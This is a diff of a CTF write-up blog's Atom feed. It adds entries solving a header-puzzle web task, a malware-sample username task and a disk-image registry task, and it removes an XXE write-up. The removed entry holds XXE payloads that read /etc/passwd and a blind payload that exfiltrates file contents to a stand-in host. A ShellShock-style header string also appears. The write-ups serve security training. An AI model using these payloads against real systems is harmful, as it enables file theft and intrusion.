@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://rawsec.ml/"/>
-  <updated>2016-11-07T21:45:06.257Z</updated>
+  <updated>2016-11-07T22:33:36.958Z</updated>
   <id>http://rawsec.ml/</id>
   
   <author>
@@ -16,11 +16,141 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>ECW - 150 - Carnet d&#39;adresses - Web</title>
-    <link href="http://rawsec.ml/en/ECW-2016-carnet-dadresse/"/>
-    <id>http://rawsec.ml/en/ECW-2016-carnet-dadresse/</id>
+    <title>School CTF - 100 - Wonder Web - Web</title>
+    <link href="http://rawsec.ml/en/SchoolCTF-2016-100-web-wonder-web/"/>
+    <id>http://rawsec.ml/en/SchoolCTF-2016-100-web-wonder-web/</id>
+    <published>2016-11-06T23:00:00.000Z</published>
+    <updated>2016-11-07T22:33:36.958Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>noraj</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
+<li><strong>Name</strong> : School CTF 2016</li>
+<li><strong>Website</strong> : <a href="https://school-ctf.org/" target="_blank" rel="external">https://school-ctf.org/</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy - Student</li>
+<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/384" target="_blank" rel="external">link</a></li>
+</ul>
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
+<p>In the year 2337 we finally secured the WEB! Now we have headers for anything you want. Everybody can make their site secure just by setting ALL the headers on the server.</p>
+<p>I just ported a demo page from the future to your time, so you can look how wonderful it is!</p>
+<p><a href="http://wonder.task.school-ctf.org" target="_blank" rel="external">http://wonder.task.school-ctf.org</a></p>
+</blockquote>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>As the description suggests, let’s take a look at headers:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">Allow-Siri-Google-Cortana-Search-Clients: 1</div><div class="line">Anti-HPKP-Suicide: ignoreAfter=6000000</div><div class="line">Browser-Restrict: openInNewTab=false; noRefererFromHere=1</div><div class="line">Check-CDN-Revocation-List: 1; ignoreIfError;</div><div class="line">Connection: keep-alive</div><div class="line">Content-Encoding: gzip</div><div class="line">Content-Meaning: none; flag-part-number=5 part-content=54f3&#125;;</div><div class="line">Content-Type: text/html; charset=utf-8</div><div class="line">Date: Sun, 06 Nov 2016 11:46:31 GMT</div><div class="line">Flag-First-Part-Is-Here: encoding=base64; part1=U2Nob29sQ1RGezUwbTNkNHk=;</div><div class="line">Flag-Parts-Connector: character=_; charCode=95; hexCharCode=0x5f;</div><div class="line">Flag-Security-Policy: headers, ecnryption=none,</div><div class="line">Server: nginx/1.4.6 (Ubuntu)</div><div class="line">Set-Cookie: uselessCookie=uselessVal; Secure; StoreEncrypted=1; ExtensionsCanRead=0; DeleteOnBrowserExit=1l</div><div class="line">Strict-Transport-Security-I-Broke-Something-Please-Downgrade-If-Error: 1</div><div class="line">Task: category=joy; ucucuga=sure; encoding=none; justString=true; flagPresent=1; flagPart2=17; flagPart4=b3</div><div class="line">Transfer-Encoding: chunked</div><div class="line">X-Bug-Bounty: openRedirects=false; logoutCSRF=false; selfXSS=false;</div><div class="line">X-Content-Config: blink-origin-in-addressbar, disable-addressbar-copy-paste, disable-javascript-history-api</div><div class="line">X-Do-Not-Link-From-These-Sites: /blacklist.txt</div><div class="line">X-FRAME-Restrict: minhsize:100px; minvsize:100px; readable</div><div class="line">X-Frame-Options: SAMEORIGIN</div><div class="line">X-Header: meaning=none;</div><div class="line">X-If-You-Read-This-Join-Tomsk-State-University: additional-points=5; url=http://www.fpmk.tsu.ru/node/474;</div><div class="line">X-Ignore-CSP-Whitelists: 1</div><div class="line">X-Mouse-Disable-Click-After-Page: 3 secodns</div><div class="line">X-Nikita-Please-Add-This-Header: False</div><div class="line">X-Order-To-KFC: order=coffee; order=fried-potato; transport=SASHA</div><div class="line">X-Papper-Compatibility: disallow</div><div class="line">X-ShellShock-vector: ()&#123;;&#125;; echo &quot;Want flag?&quot;; python -c &apos;part3=&quot;77316c6c&quot;; print part3.decode(&quot;hex&quot;)&apos;</div><div class="line">X-Super-Hero-Status: False</div><div class="line">X-Window-Restrictions: disallow-from-window-open</div><div class="line">X-XXX-Movie: url=goo.gl/0kGizJ</div><div class="line">Y-Toilet-Papper-Compatibility: allow</div><div class="line">content-security-policy: real-strict-dynamic</div><div class="line">strict-transport-security: max-age=31536000000000000</div><div class="line">x-xss-protection: -1; mode=ignoreheader</div></pre></td></tr></table></figure>
+<p>Ok… such a mess… and such a troll challenge!</p>
+<p>Part 1:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ echo -n &quot;U2Nob29sQ1RGezUwbTNkNHk=&quot; | base64 -d                               </div><div class="line">SchoolCTF&#123;50m3d4y_17_w1ll_b3_54f3&#125;</div></pre></td></tr></table></figure>
+<p>Part 2 &amp; part 4:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flagPart2=17; flagPart4=b3</div></pre></td></tr></table></figure>
+<p>Part 3 (don’t run the fork bomb):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &apos;part3=&quot;77316c6c&quot;; print part3.decode(&quot;hex&quot;)&apos;</div></pre></td></tr></table></figure>
+<p>Part 5:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Content-Meaning: none; flag-part-number=5 part-content=54f3&#125;;</div></pre></td></tr></table></figure>
+<p>Flag: <code>SchoolCTF{50m3d4y_17_w1ll_b3_54f3}</code>.</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
+    
+    </summary>
+    
+      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
+    
+    
+      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
+    
+      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
+    
+      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>School CTF - 100 - n4M3 - Forensics</title>
+    <link href="http://rawsec.ml/en/SchoolCTF-2016-100-forensics-n4M3/"/>
+    <id>http://rawsec.ml/en/SchoolCTF-2016-100-forensics-n4M3/</id>
+    <published>2016-11-06T23:00:00.000Z</published>
+    <updated>2016-11-07T22:33:36.955Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>noraj</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
+<li><strong>Name</strong> : School CTF 2016</li>
+<li><strong>Website</strong> : <a href="https://school-ctf.org/" target="_blank" rel="external">https://school-ctf.org/</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy - Student</li>
+<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/384" target="_blank" rel="external">link</a></li>
+</ul>
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
+<p>Johny Droptables went on the trail of hackers _xXx_-=BoStOnSkIe_Pu$$ies_1337=-_xXx_. You can get the login of one of them.</p>
+<p>The flag is the login of the hacker.</p>
+<p><a href="https://school-ctf.org/files/malware_2d8365fd8ff77417c63714e2d91736fbd5de74d9.zip" target="_blank" rel="external">malware</a></p>
+</blockquote>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Unzip and open <code>malware.exe</code> with an hex editor. You will see a Windows PATH <code>c:\users\b05t0n_n491b4t0r_133\[...]</code>. So we got the login of the guy.</p>
+<p>Flag: <code>SchoolCTF{b05t0n_n491b4t0r_133}</code>.</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
+    
+    </summary>
+    
+      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
+    
+    
+      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
+    
+      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
+    
+      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ECW - 150 - Alternative Persistent Threat - Forensics</title>
+    <link href="http://rawsec.ml/en/ECW-2016-Alternative-Persistent-Threat/"/>
+    <id>http://rawsec.ml/en/ECW-2016-Alternative-Persistent-Threat/</id>
     <published>2016-11-05T23:00:00.000Z</published>
-    <updated>2016-11-07T21:45:06.257Z</updated>
+    <updated>2016-11-07T21:44:43.303Z</updated>
     
     <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
 <thead>
@@ -45,38 +175,97 @@
 <li><strong>Format</strong> : Jeopardy - Student</li>
 </ul>
 <h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This one is a XML External Entity ([XXE][xxe]) attack and Out-Of-Band (OOB) channel exfiltration is not working.</p>
-<p><a href="https://www.gracefulsecurity.com/xml-external-entity-injection-xxe-vulnerabilities/" target="_blank" rel="external">xxe</a></p>
-<p>We are given the following form:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jean Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure>
-<p>And the following answer confirming the well formated XML request:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./MNfloDfo.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;Jean Dupont&apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./MNfloDfo.xml</div></pre></td></tr></table></figure>
-<p>We should be able to leak data into the answer banner.</p>
-<p>Confirmation that entities are interpreted:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe "XXE vuln"&gt;]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;t<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./J2tuDR8g.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;XXE vulnt&apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./J2tuDR8g.xml</div></pre></td></tr></table></figure>
-<p>Nice that’s working so try to leak some files:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe SYSTEM "http://example.org/test"&gt;]&gt;</div></pre></td></tr></table></figure>
-<p>=&gt; doesn’t work</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></div></pre></td></tr></table></figure>
-<p>=&gt; doesn’t work</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" &gt;]&gt;</span></div></pre></td></tr></table></figure>
-<p>=&gt; doesn’t work</p>
-<p>[…] and we tried a lot of logical filename on various operating systems.</p>
-<p>But how did we find out the right? The challenge required no logic but only guessing …</p>
-<p>I firstly thought the banner was useless because no file was leaked in it. So I thought it was some blind xxe:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE contacts [ &lt;!ENTITY % pe SYSTEM &quot;http://example.org/xxe_file&quot;&gt; %pe; %param1; ]&gt;</div><div class="line">&lt;contacts&gt;</div><div class="line">  &lt;contact&gt;</div><div class="line">    &lt;name&gt;&amp;external;&lt;/name&gt;</div><div class="line">    [...]</div></pre></td></tr></table></figure>
-<p><code>xxe_file</code>:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY external SYSTEM &apos;http://example.org/log_xxe?data=%payload;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
-<p>And a tried a lot…</p>
-<p>But no, in fact no files were leakable exept <code>flag.txt</code>. It was impossible to find out it was just guessing because rules and description didn’t mention any convention.</p>
-<p>I passed hours on days to craft sophishticated blind xxe requests and it was only a very easy xxe but filename had to be guessed, it was easy to think that xxe was not working as others files was not leaked.</p>
-<p>Realistic challenge should have be better.</p>
-<p>But indeed some people find it realy easily as <code>flag.txt</code> can be common in CTF.</p>
-<p>I insist on the fact that’s is only CTF guessing, in real life this never occurs.</p>
-<p>Here was the easy XXE :</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe SYSTEM "flag.txt"&gt;]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./WDpFYEM5.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;ECW&#123;8dd72b9b3095380de595d734492d69c9&#125; &apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./WDpFYEM5.xml</div></pre></td></tr></table></figure>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>We used <a href="http://www.arxsys.fr/discover/" target="_blank" rel="external">Digital Forensics Framework (DFF)</a></p>
+<p>We can view that <strong>usb.dd</strong> is NTFS partition in the hex view so we mounted it as it.</p>
+<p>We browsed the files and this one retaind our attention: <code>usb.dd/NTFS/Users/windows/Documents/tmp_rqsu78.docx:flag</code>.</p>
+<p>Its content is:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;Get the data from the default value of the key HKLM\SYSTEM\CurrentControlSet\Control\DeviceContainers\&#123;000001111-2345178-232416-99801&#125;&apos;</div></pre></td></tr></table></figure>
+<p>So we need to find Windows registry and browse it.</p>
+<blockquote>
+<p>The location of these registry hives are as follows:<br><code>HKEY_LOCAL_MACHINE \SYSTEM</code> : <code>\system32\config\system</code></p>
+</blockquote>
+<p>Source: <a href="http://www.thewindowsclub.com/where-are-the-windows-registry-files-located-in-windows-7" target="_blank" rel="external">http://www.thewindowsclub.com/where-are-the-windows-registry-files-located-in-windows-7</a></p>
+<p>We browsed it and the value of the key was: <code>a2486aac827711258d0642176cc4f8c2</code>.</p>
+<p>So the flag is <code>ECW{a2486aac827711258d0642176cc4f8c2}</code>.</p>
+<p><strong>Bonus</strong>:</p>
+<ul>
+<li><code>/Logical files/temp/usb.dd/NTFS/!j3CtfuSD5zz1RfB=MlsL]u-k8O5v+,P</code> was certainly the target location of the attack.</li>
+<li>There was also a <code>no flag here.txt</code> troll file in <code>Windows\system32\config\</code> containing a pretty list of fake flags:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">ECW&#123;ee4f493d149e634540b79ed030b3790e&#125;</div><div class="line">ECW&#123;ef20996f87a1c172223d1796f155cabb&#125;</div><div class="line">ECW&#123;78a4b8dd2614fea24d694aaad4e5ee7c&#125;</div><div class="line">ECW&#123;2942e64a0b3836b84aa18311be73804d&#125;</div><div class="line">ECW&#123;860d8070c9fed931856856b2957316d9&#125;</div><div class="line">ECW&#123;5c07ee2b8313b406a32325c7a2924011&#125;</div><div class="line">ECW&#123;20b1ab287f9f4485800b15ba9cb933b0&#125;</div><div class="line">ECW&#123;31470d8d9676ee5d17fe79317124d67a&#125;</div><div class="line">ECW&#123;c0ad5adadd6dc5871f4cc66370757d9a&#125;</div><div class="line">ECW&#123;d28aeba8bb169a6f628d77b7059e9110&#125;</div><div class="line">ECW&#123;c9f619827e73ce3d61048b0ddb49ec84&#125;</div><div class="line">ECW&#123;07c563dd9f91b19a18d8876e89188593&#125;</div><div class="line">ECW&#123;46f8ba8cd62e3334e05501407d653587&#125;</div><div class="line">ECW&#123;d55e0d52fa7c5ccb0af9efa488f5206d&#125;</div><div class="line">ECW&#123;269c20f280f7326c674811f59ece9cab&#125;</div><div class="line">ECW&#123;656122abbb817863ae145539bb0eeb03&#125;</div><div class="line">ECW&#123;d1b46e0fa5e5c0375ade62ff820ce631&#125;</div><div class="line">ECW&#123;62fd1f329ac8d59e6c4052e45b6121bf&#125;</div><div class="line">ECW&#123;c4393a542ae85e178cf7da6cee80139d&#125;</div><div class="line">ECW&#123;0ae1fcf8c1b5e378ba62736d59ab346c&#125;</div><div class="line">ECW&#123;31e42f6a1adeb6350cda9270c164855f&#125;</div><div class="line">ECW&#123;6a1dd34361fe943af6a4c4a71584ac2f&#125;</div><div class="line">ECW&#123;bc65d36be9d0c6877cc0b200002e4e2d&#125;</div><div class="line">ECW&#123;a0a7c3fff21f2aea3cfa1d0316dd816c&#125;</div><div class="line">ECW&#123;4cf2d64e44205fe628ddd534e1151b58&#125;</div><div class="line">ECW&#123;9cc72dc973e24f9623bd3fe708f60ef5&#125;</div><div class="line">ECW&#123;579a3c1e12a1e74a98169175fb913012&#125;</div><div class="line">ECW&#123;2b7ea5cee3c49ff53d41e00785eb974c&#125;</div><div class="line">ECW&#123;a4a7e457b55b5ac2877f7973dbba37e9&#125;</div><div class="line">ECW&#123;01b1688f97f94776baae85d77b06048b&#125;</div><div class="line">ECW&#123;9b64ca5761c6de555d7d1b3c948ecfeb&#125;</div><div class="line">ECW&#123;3ff6ba9cf6d8e5332978e057559b5562&#125;</div><div class="line">ECW&#123;7dfe15854212a30f346da5255c1d794b&#125;</div><div class="line">ECW&#123;f51b02427757e79621b5235d7efdf117&#125;</div><div class="line">ECW&#123;e0e8b9912a4793170fd23f7aa4c6d68c&#125;</div><div class="line">ECW&#123;036208b4a1ab4a235d75c181e685e5a3&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;7fad9816d7334cc470e5dc82d06e222f&#125;</div><div class="line">ECW&#123;d69fc8c97d906264c98463b4bca59fd4&#125;</div><div class="line">ECW&#123;5088741fd5456ef3471fe11022575e03&#125;</div><div class="line">ECW&#123;4d3f80683b3b9021f517e5b9920d0126&#125;</div><div class="line">ECW&#123;73a00957034783b7b5c8294c54cd3e12&#125;</div><div class="line">ECW&#123;1f77c389e0a69652980c341170d0834b&#125;</div><div class="line">ECW&#123;b42d4ed9a6bf5cda33366c01be5d11cb&#125;</div><div class="line">ECW&#123;c9440da5b11074fca7966ecde2fe3c97&#125;</div><div class="line">ECW&#123;6258191d167c56dcdb51ae9fa2faee23&#125;</div><div class="line">ECW&#123;095fd6a167e3c0f7331a1a6b97969c83&#125;</div><div class="line">ECW&#123;40942c14fbaaff0523b88ab781900cfd&#125;</div><div class="line">ECW&#123;39e14ad7477262c347f2e6d927a6518c&#125;</div><div class="line">ECW&#123;cdfb31c9bd2ea0c6d87206224466ac75&#125;</div><div class="line">ECW&#123;663f929002e1547fd2bf67e72f1b85e0&#125;</div><div class="line">ECW&#123;2eedce1bca0150e3dcda7e77f4d8ecfd&#125;</div><div class="line">ECW&#123;35b88728559e409dd550eb818228c99e&#125;</div><div class="line">ECW&#123;469966e739df10b55c3c8ee3ad572617&#125;</div><div class="line">ECW&#123;5146da32deef5fee7df9461eeca13e7b&#125;</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
